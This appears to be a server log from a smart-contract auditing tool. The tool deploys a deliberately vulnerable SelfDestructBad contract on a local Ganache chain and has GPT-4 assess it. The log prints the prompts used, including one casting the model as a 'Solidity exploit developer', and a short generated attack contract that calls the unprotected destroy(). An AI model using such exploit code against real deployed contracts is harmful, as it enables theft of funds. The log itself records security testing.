2025-06-22 21:11:13,250 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 21:11:13,252 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 21:11:13,255 - werkzeug - INFO - 192.168.176.1 - - [22/Jun/2025 21:11:13] "GET /history HTTP/1.1" 200 -
2025-06-22 21:11:51,066 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-22 21:11:51,081 - app.api.contract - INFO - Analyzing code snippet
2025-06-22 21:11:51,099 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-22 21:11:51,104 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpord473d8.sol
2025-06-22 21:11:51,113 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-22 21:11:51,115 - app.services.contract_service - INFO - Compiling contract...
2025-06-22 21:11:51,126 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-06-22 21:11:51,128 - app.services.contract_service - WARNING - No contracts compiled
2025-06-22 21:11:51,129 - app.services.contract_service - INFO - Temporary file /tmp/tmpord473d8.sol removed
2025-06-22 21:11:51,130 - app.api.contract - WARNING - No valid Solidity contract found in the provided code
2025-06-22 21:11:51,133 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-22 21:11:51,135 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-22 21:11:51,137 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-22 21:11:51,138 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-22 21:11:51,141 - werkzeug - INFO - 192.168.176.1 - - [22/Jun/2025 21:11:51] "[31m[1mPOST /analyze HTTP/1.1[0m" 400 -
2025-06-23 06:01:28,740 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 06:01:28,949 - app.app - INFO - Application started
2025-06-23 06:01:28,973 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.176.3:8000
2025-06-23 06:01:28,978 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 06:02:06,623 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 06:02:06,785 - app.app - INFO - Application started
2025-06-23 06:02:06,795 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.19.0.5:8000
2025-06-23 06:02:06,797 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 06:02:28,543 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:02:28,546 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:02:28,556 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:02:28,561 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 06:02:28,566 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:02:28] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 06:02:28,583 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 06:02:28,587 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '79', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 06:02:28,590 - app.api.auth - INFO - Request content type: application/json
2025-06-23 06:02:28,594 - app.api.auth - INFO - Processing JSON request
2025-06-23 06:02:28,597 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 06:02:29,039 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 06:02:29,042 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:02:29,045 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:02:29,046 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:02:29,047 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 06:02:29,049 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:02:29] "POST /login HTTP/1.1" 200 -
2025-06-23 06:02:31,827 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:02:31,833 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:02:31,840 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:02:31,845 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 06:02:31,849 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:02:31] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-23 06:02:31,867 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 06:02:31,879 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 06:02:31,886 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 06:02:31,890 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpw1q1e7cr.sol
2025-06-23 06:02:31,899 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 06:02:31,900 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 06:02:32,060 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-23 06:02:32,895 - solcx - INFO - Using solc version 0.8.0
2025-06-23 06:02:32,898 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-23 06:02:32,903 - solcx - INFO - Using solc version 0.8.0
2025-06-23 06:02:33,738 - app.services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-06-23 06:02:33,740 - app.services.contract_service - INFO - Deploying 1 contracts...
2025-06-23 06:02:34,217 - app.services.contract_service - INFO - Contract SelfDestructBad deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-06-23 06:02:34,218 - app.services.contract_service - INFO - Setting up contract SelfDestructBad...
2025-06-23 06:02:34,255 - app.services.contract_service - INFO - Contract SelfDestructBad setup completed
2025-06-23 06:02:34,257 - app.services.contract_service - INFO - Funding contract SelfDestructBad for attack testing...
2025-06-23 06:02:34,416 - app.services.contract_service - INFO - Contract SelfDestructBad funded
2025-06-23 06:02:34,418 - app.services.contract_service - INFO - Building contract observation...
2025-06-23 06:02:34,500 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-23 06:02:34,501 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-23 06:02:34,502 - app.services.contract_service - INFO - Running Slither analysis...
2025-06-23 06:02:34,513 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-06-23 06:02:34,537 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-06-23 06:02:34,538 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-23 06:02:34,539 - app.modules.attack_generator - INFO - Contract name: SelfDestructBad
2025-06-23 06:02:34,540 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-23 06:02:34,541 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-23 06:02:34,543 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 06:02:34,544 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 06:02:34,545 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 06:02:43,933 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 06:02:43,971 - app.modules.attack_generator - INFO - Received response from OpenAI API in 9.43 seconds
2025-06-23 06:02:43,978 - app.modules.attack_generator - INFO - Contract analysis completed in 9.43 seconds
2025-06-23 06:02:43,980 - app.modules.attack_generator - INFO - Vulnerability assessment: - **Unrestricted Self-Destruct:** The `destroy()` function is public and has no access control, allo...
2025-06-23 06:02:43,983 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-23 06:02:43,985 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-23 06:02:43,986 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-23 06:02:43,987 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-23 06:02:47,393 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 06:02:47,400 - app.modules.attack_generator - INFO - Received response from OpenAI API in 3.41 seconds
2025-06-23 06:02:47,403 - app.modules.attack_generator - INFO - Attack code generation completed in 3.41 seconds
2025-06-23 06:02:47,404 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 304
2025-06-23 06:02:47,405 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 12.84 seconds
2025-06-23 06:02:47,407 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-23 06:02:47,410 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpw1q1e7cr.sol",\n  "contracts": [\n    {\n      "contract_name": "SelfDestructBad",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "name": "destroy",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "destroy",\n          "signature": "destroy()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99996722360000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract SelfDestructBad {\\n    function destroy() public {\\n        selfdestruct(payable(msg.sender));\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': "1. Contract Analysis:  \nThe contract `SelfDestructBad` is a minimal contract with a single public function `destroy()` that calls `selfdestruct(payable(msg.sender))`. This means anyone can call `destroy()` and trigger the contract's self-destruction, sending any remaining ETH balance to the caller.\n\n2. Vulnerability Assessment:  \n- **Unrestricted Self-Destruct:** The `destroy()` function is public and has no access control, allowing any user to destroy the contract at any time.  \n- **Impact:** Although the contract currently holds zero ETH, if it were to hold any ETH or other assets in the future, any user could irreversibly destroy the contract and withdraw the funds to themselves. This is a critical permission issue and a backdoor that allows anyone to kill the contract and seize its balance.  \n- **Additional Considerations:** Since the contract has no other logic or storage, the main risk is the premature or unauthorized destruction of the contract, which could disrupt any dependent systems or services relying on it.\n\n3. Exploitation Requirements:  \n- No setup is required. Any user can call `destroy()` immediately to self-destruct the contract and receive any ETH balance it holds.\n\n---\n\n**Solidity version:** pragma solidity ^0.8.0;", 'contract_analysis': "The contract `SelfDestructBad` is a minimal contract with a single public function `destroy()` that calls `selfdestruct(payable(msg.sender))`. This means anyone can call `destroy()` and trigger the contract's self-destruction, sending any remaining ETH balance to the caller.\n\n2.", 'vulnerability_assessment': '- **Unrestricted Self-Destruct:** The `destroy()` function is public and has no access control, allowing any user to destroy the contract at any time.  \n- **Impact:** Although the contract currently holds zero ETH, if it were to hold any ETH or other assets in the future, any user could irreversibly destroy the contract and withdraw the funds to themselves. This is a critical permission issue and a backdoor that allows anyone to kill the contract and seize its balance.  \n- **Additional Considerations:** Since the contract has no other logic or storage, the main risk is the premature or unauthorized destruction of the contract, which could disrupt any dependent systems or services relying on it.\n\n3.', 'exploitation_requirements': '- No setup is required. Any user can call `destroy()` immediately to self-destruct the contract and receive any ETH balance it holds.', 'analysis_duration': 9.426555633544922}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The contract `SelfDestructBad` is a minimal contract with a single public function `destroy()` that calls `selfdestruct(payable(msg.sender))`. This means anyone can call `destroy()` and trigger the contract's self-destruction, sending any remaining ETH balance to the caller.\n\n2.\n\nVulnerability Assessment: - **Unrestricted Self-Destruct:** The `destroy()` function is public and has no access control, allowing any user to destroy the contract at any time.  \n- **Impact:** Although the contract currently holds zero ETH, if it were to hold any ETH or other assets in the future, any user could irreversibly destroy the contract and withdraw the funds to themselves. This is a critical permission issue and a backdoor that allows anyone to kill the contract and seize its balance.  \n- **Additional Considerations:** Since the contract has no other logic or storage, the main risk is the premature or unauthorized destruction of the contract, which could disrupt any dependent systems or services relying on it.\n\n3.\n\nExploitation Requirements: - No setup is required. Any user can call `destroy()` immediately to self-destruct the contract and receive any ETH balance it holds.\n\n\nTarget Contract Address: 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.8.0\n", 'attack_raw_response': '```solidity\npragma solidity 0.8.0;\n\ninterface ISelfDestructBad {\n    function destroy() external;\n}\n\ncontract AttackSelfDestructBad {\n    ISelfDestructBad target;\n\n    constructor(address _target) {\n        target = ISelfDestructBad(_target);\n    }\n\n    function attack() external {\n        target.destroy();\n    }\n}\n```', 'code': 'pragma solidity 0.8.0;\n\ninterface ISelfDestructBad {\n    function destroy() external;\n}\n\ncontract AttackSelfDestructBad {\n    ISelfDestructBad target;\n\n    constructor(address _target) {\n        target = ISelfDestructBad(_target);\n    }\n\n    function attack() external {\n        target.destroy();\n    }\n}', 'code_type': 'solidity', 'attack_duration': 3.413609027862549}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpw1q1e7cr.sol",\n  "contracts": [\n    {\n      "contract_name": "SelfDestructBad",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [],\n          "name": "destroy",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "destroy",\n          "signature": "destroy()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99996722360000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract SelfDestructBad {\\n    function destroy() public {\\n        selfdestruct(payable(msg.sender));\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': "1. Contract Analysis:  \nThe contract `SelfDestructBad` is a minimal contract with a single public function `destroy()` that calls `selfdestruct(payable(msg.sender))`. This means anyone can call `destroy()` and trigger the contract's self-destruction, sending any remaining ETH balance to the caller.\n\n2. Vulnerability Assessment:  \n- **Unrestricted Self-Destruct:** The `destroy()` function is public and has no access control, allowing any user to destroy the contract at any time.  \n- **Impact:** Although the contract currently holds zero ETH, if it were to hold any ETH or other assets in the future, any user could irreversibly destroy the contract and withdraw the funds to themselves. This is a critical permission issue and a backdoor that allows anyone to kill the contract and seize its balance.  \n- **Additional Considerations:** Since the contract has no other logic or storage, the main risk is the premature or unauthorized destruction of the contract, which could disrupt any dependent systems or services relying on it.\n\n3. Exploitation Requirements:  \n- No setup is required. Any user can call `destroy()` immediately to self-destruct the contract and receive any ETH balance it holds.\n\n---\n\n**Solidity version:** pragma solidity ^0.8.0;", 'reasoning': "The contract `SelfDestructBad` is a minimal contract with a single public function `destroy()` that calls `selfdestruct(payable(msg.sender))`. This means anyone can call `destroy()` and trigger the contract's self-destruction, sending any remaining ETH balance to the caller.\n\n2.", 'summary': '- **Unrestricted Self-Destruct:** The `destroy()` function is public and has no access control, allowing any user to destroy the contract at any time.  \n- **Impact:** Although the contract currently holds zero ETH, if it were to hold any ETH or other assets in the future, any user could irreversibly destroy the contract and withdraw the funds to themselves. This is a critical permission issue and a backdoor that allows anyone to kill the contract and seize its balance.  \n- **Additional Considerations:** Since the contract has no other logic or storage, the main risk is the premature or unauthorized destruction of the contract, which could disrupt any dependent systems or services relying on it.\n\n3.', 'code': 'pragma solidity 0.8.0;\n\ninterface ISelfDestructBad {\n    function destroy() external;\n}\n\ncontract AttackSelfDestructBad {\n    ISelfDestructBad target;\n\n    constructor(address _target) {\n        target = ISelfDestructBad(_target);\n    }\n\n    function attack() external {\n        target.destroy();\n    }\n}', 'code_type': 'solidity', 'duration': 12.84016466140747}
2025-06-23 06:02:47,412 - app.services.contract_service - INFO - Has exploit code: True
2025-06-23 06:02:47,414 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-06-23 06:02:47,415 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-06-23 06:02:47,416 - app.services.contract_service - INFO - Attack strategy summary: - **Unrestricted Self-Destruct:** The `destroy()` function is public and has no access control, allowing any user to destroy the contract at any time.  
- **Impact:** Although the contract currently holds zero ETH, if it were to hold any ETH or other assets in the future, any user could irreversibly destroy the contract and withdraw the funds to themselves. This is a critical permission issue and a backdoor that allows anyone to kill the contract and seize its balance.  
- **Additional Considerations:** Since the contract has no other logic or storage, the main risk is the premature or unauthorized destruction of the contract, which could disrupt any dependent systems or services relying on it.

3.
2025-06-23 06:02:47,418 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-06-23 06:02:47,420 - app.services.contract_service - INFO - Temporary file /tmp/tmpw1q1e7cr.sol removed
2025-06-23 06:02:47,459 - app.api.contract - INFO - Report saved with filename: SelfDestructBad_2025-06-23_06-02, status: KO
2025-06-23 06:02:47,461 - app.api.contract - INFO - Analysis completed successfully, returning report
